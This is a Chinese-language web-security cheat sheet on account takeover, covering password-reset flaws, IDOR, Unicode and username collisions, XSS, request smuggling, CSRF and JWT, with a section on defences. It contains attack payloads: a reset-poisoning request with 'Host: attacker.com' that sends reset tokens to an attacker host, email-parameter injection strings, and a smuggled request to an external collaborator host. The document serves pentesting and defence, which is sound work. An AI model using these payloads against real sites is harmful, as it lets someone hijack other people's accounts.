# 账户接管 (Account Takeover)

> 账户接管(Account Takeover, ATO)是网络安全领域中的一项重大威胁，涉及通过各种攻击向量未经授权访问用户账户。

## 账户接管攻击原理

账户接管(ATO)攻击是指攻击者通过各种手段获取合法用户账户的控制权。了解这些攻击技术对于保护用户账户安全至关重要。

### 攻击原理

1. **凭证窃取**：
   - 网络钓鱼攻击获取用户凭证
   - 凭证填充攻击(使用泄露的凭证)
   - 暴力破解弱密码
   - 键盘记录器

2. **会话劫持**：
   - 窃取会话令牌
   - 会话固定攻击
   - 跨站脚本(XSS)攻击
   - 中间人攻击

3. **密码重置漏洞**：
   - 弱密码重置令牌
   - 令牌泄露
   - 逻辑缺陷
   - 不安全的重定向

4. **社会工程学**：
   - 钓鱼邮件
   - 假冒客服
   - 诱导用户执行恶意操作

### 攻击影响

- 未经授权访问敏感数据
- 金融欺诈
- 身份盗用
- 服务滥用
- 数据泄露
- 声誉损失

### 防御措施

- 实施多因素认证(MFA)
- 密码策略和账户锁定机制
- 安全的密码重置流程
- 会话管理安全
- 监控异常登录活动
- 安全意识培训

## 目录

* [密码重置功能](#密码重置功能)
    * [通过Referrer泄露密码重置令牌](#通过referrer泄露密码重置令牌)
    * [通过密码重置投毒进行账户接管](#通过密码重置投毒进行账户接管)
    * [通过Email参数重置密码](#通过email参数重置密码)
    * [API参数中的IDOR漏洞](#api参数中的idor漏洞)
    * [弱密码重置令牌](#弱密码重置令牌)
    * [泄露密码重置令牌](#泄露密码重置令牌)
    * [通过用户名冲突重置密码](#通过用户名冲突重置密码)
    * [Unicode规范化问题导致的账户接管](#unicode规范化问题导致的账户接管)
* [通过Web漏洞进行账户接管](#通过web漏洞进行账户接管)
    * [通过跨站脚本进行账户接管](#通过跨站脚本进行账户接管)
    * [通过HTTP请求走私进行账户接管](#通过http请求走私进行账户接管)
    * [通过CSRF进行账户接管](#通过csrf进行账户接管)
    * [通过JWT进行账户接管](#通过jwt进行账户接管)
* [防御措施](#防御措施)
* [参考资料](#参考资料)

## 密码重置功能

### 通过Referrer泄露密码重置令牌

1. 向您的电子邮件地址请求密码重置
2. 点击密码重置链接
3. 不要更改密码
4. 点击任何第三方网站（例如：Facebook、Twitter）
5. 在Burp Suite代理中拦截请求
6. 检查referer头是否泄露了密码重置令牌

### 通过密码重置投毒进行账户接管

1. 在Burp Suite中拦截密码重置请求
2. 在Burp Suite中添加或编辑以下头信息：`Host: attacker.com`，`X-Forwarded-Host: attacker.com`
3. 转发带有修改后头的请求

    ```http
    POST https://example.com/reset.php HTTP/1.1
    Accept: */*
    Content-Type: application/json
    Host: attacker.com
    ```

4. 查找基于*host头*的密码重置URL，例如：`https://attacker.com/reset-password.php?token=TOKEN`

### 通过Email参数重置密码

```powershell
# 参数污染
email=victim@mail.com&email=hacker@mail.com

# 电子邮件数组
{"email":["victim@mail.com","hacker@mail.com"]}

# 抄送
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# 分隔符
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```

### API参数中的IDOR漏洞

1. 攻击者需要登录自己的账户并进入**更改密码**功能
2. 启动Burp Suite并拦截请求
3. 发送到repeater标签并编辑参数：用户ID/电子邮件

    ```powershell
    POST /api/changepass
    [...]
    ("form": {"email":"victim@email.com","password":"securepwd"})
    ```

### 弱密码重置令牌

密码重置令牌应随机生成且每次唯一。尝试确定令牌是否过期或是否始终相同，在某些情况下，生成算法可能很弱且可被猜测。算法可能使用以下变量：

* 时间戳
* 用户ID
* 用户电子邮件
* 名和姓
* 出生日期
* 加密算法
* 仅数字
* 短令牌序列（<6个字符，包含[A-Z,a-z,0-9]）
* 令牌重用
* 令牌过期日期

### 泄露密码重置令牌

1. 使用API/UI为特定电子邮件触发密码重置请求，例如：<test@mail.com>
2. 检查服务器响应，查找`resetToken`
3. 然后在URL中使用令牌，如`https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### 通过用户名冲突重置密码

1. 使用与受害者用户名相同但在用户名前后插入空格的用户名在系统上注册，例如：`"admin "`
2. 使用您的恶意用户名请求密码重置
3. 使用发送到您电子邮件的令牌重置受害者密码
4. 使用新密码连接到受害者账户

CTFd平台曾受此漏洞影响。
参见：[CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Unicode规范化问题导致的账户接管

当处理涉及Unicode以进行大小写映射或规范化的用户输入时，可能会出现意外行为。

* 受害者账户：`demo@gmail.com`
* 攻击者账户：`demⓞ@gmail.com`

[Unisub - 一个可以建议可能转换为给定字符的Unicode字符的工具](https://github.com/tomnomnom/hacks/tree/master/unisub)。

[Unicode渗透测试速查表](https://gosecure.github.io/unicode-pentester-cheatsheet/)可用于根据平台查找适合的Unicode字符列表。

## 通过Web漏洞进行账户接管

### 通过跨站脚本进行账户接管

1. 在应用程序或子域中查找XSS漏洞，如果cookie作用域为父域：`*.domain.com`
2. 泄露当前**会话cookie**
3. 使用该cookie以用户身份进行身份验证

### 通过HTTP请求走私进行账户接管

参考**HTTP请求走私**漏洞页面。

1. 使用**smuggler**检测HTTP请求走私类型（CL、TE、CL.TE）

    ```powershell
    git clone https://github.com/defparam/smuggler.git
    cd smuggler
    python3 smuggler.py -h
    ```

2. 制作一个请求，用以下数据覆盖`POST / HTTP/1.1`：

    ```powershell
    GET http://something.burpcollaborator.net  HTTP/1.1
    X: 
    ```

3. 最终请求可能如下所示

    ```powershell
    GET /  HTTP/1.1
    Transfer-Encoding: chunked
    Host: something.com
    User-Agent: Smuggler/v1.0
    Content-Length: 83

    0

    GET http://something.burpcollaborator.net  HTTP/1.1
    X: X
    ```

利用此漏洞的Hackerone报告

* <https://hackerone.com/reports/737140>
* <https://hackerone.com/reports/771666>

### 通过CSRF进行账户接管

1. 为CSRF创建有效负载，例如："带有自动提交的HTML表单，用于更改密码"
2. 发送有效负载

### 通过JWT进行账户接管

JSON Web Token可能用于验证用户身份。

* 使用另一个用户ID/电子邮件编辑JWT
* 检查JWT签名是否弱

## 防御措施

1. **强化认证机制**：
   - 实施多因素认证(MFA)
   - 使用强密码策略
   - 实现账户锁定机制

2. **安全开发实践**：
   - 在所有敏感操作上实施CSRF保护
   - 使用安全的会话管理
   - 实现安全的密码重置流程

3. **输入验证和输出编码**：
   - 验证所有用户输入
   - 对输出进行编码以防止XSS
   - 使用内容安全策略(CSP)

4. **监控和日志记录**：
   - 监控异常登录活动
   - 记录安全事件
   - 实施异常检测

5. **安全意识培训**：
   - 教育用户识别网络钓鱼尝试
   - 提供安全使用指南
   - 报告可疑活动

## 参考资料

* [$6,500 + $5,000 HTTP请求走私大规模账户接管 - Slack + Zomato - 漏洞赏金报告解析 - 2020年8月30日](https://www.youtube.com/watch?v=gzM4wWA7RFo)
* [10个密码重置漏洞 - Anugrah SR - 2020年9月16日](https://anugrahsr.github.io/posts/10-Password-reset-flaws/)
* [加密漏洞与账户接管 - Harsh Bothra - 2020年9月20日](https://speakerdeck.com/harshbothra/broken-cryptography-and-account-takeovers?slide=28)
* [CTFd账户接管 - NIST国家漏洞数据库 - 2020年3月29日](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)
* [通过复制和粘贴入侵Grindr账户 - Troy Hunt - 2020年10月3日](https://www.troyhunt.com/hacking-grindr-accounts-with-copy-and-paste/)
* [OWASP账户接管防御指南](https://cheatsheetseries.owasp.org/cheatsheets/Account_Takeover_Defense_Cheat_Sheet.html)
* [CISA账户接管技术指南](https://www.cisa.gov/uscert/ncas/tips/ST04-007)
